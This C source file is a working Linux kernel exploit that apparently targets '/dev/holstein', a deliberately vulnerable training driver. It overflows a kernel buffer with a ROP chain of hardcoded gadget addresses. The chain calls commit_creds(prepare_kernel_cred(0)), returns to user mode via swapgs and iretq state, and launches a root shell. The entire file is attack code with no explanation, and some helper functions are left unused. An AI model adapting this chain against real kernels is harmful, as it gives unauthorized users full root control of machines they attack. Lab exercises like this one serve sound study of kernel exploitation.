#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>

unsigned long prepare_kernel_cred = (unsigned long)0xffffffff8106e240;
unsigned long commit_creds = (unsigned long)0xffffffff8106e390;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

void* user_ss, *user_rsp, *user_rflags, *user_cs;

static  void  save_state () {
  asm (
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3 \n"
      : "=r"(user_cs),
        "=r"(user_ss),
        "=r"(user_rsp),
        "=r"(user_rflags)
      :
      : "memory" );
}


static void restore_state() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs), "r"(win));
}

static void escalate_privilege() {
  char* (*pkc)(int) = (void*)(prepare_kernel_cred);
  void (*cc)(char*) = (void*)(commit_creds);
  (*cc)((*pkc)(0));
  restore_state();
}

int main() {
  unsigned long swapgs_ret = 0xffffffff8160bfac;
  // 0xffffffff812ea9bb: pop rbi; pop rbp; ret
  unsigned long pop_rdi_pop_rbp_ret = 0xffffffff812ea9bb;
  // 0xffffffff81278105: add rdi, rax; cmp esi, 3; jg short 0xffffffff812780e5; xor eax, eax; ret;
  unsigned long add_rdi_rax = 0xffffffff81278105;
  // 0xffffffff810cff91: pop rsi; cmp dh, dh; ret;
  unsigned long pop_rsi = 0xffffffff810cff91;
  unsigned long iretq = 0xffffffff810202af;
  unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81800e26;


  int fd = open( "/dev/holstein" , O_RDWR);
  if (fd == -1 )
    perror( "open(\"/dev/holstein\")" );

  save_state();
  char buf[0x408+8*20];
  memset(buf, 'A', sizeof(buf));
  printf("%d\n", sizeof(buf));

  unsigned  long *chain = ( unsigned  long *)&buf[ 0x408 ];
  *chain++ = pop_rdi_pop_rbp_ret;
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = pop_rdi_pop_rbp_ret;
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = pop_rsi;
  *chain++ = 0;
  *chain++ = add_rdi_rax;
  *chain++ = commit_creds;
  *chain++ = swapgs_restore_regs_and_return_to_usermode;
  *chain++ = 0xdeadbeef ; 
  *chain++ = 0xdeadbeef ; 
  *chain++ = win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;


  write(fd, buf, sizeof(buf));

}
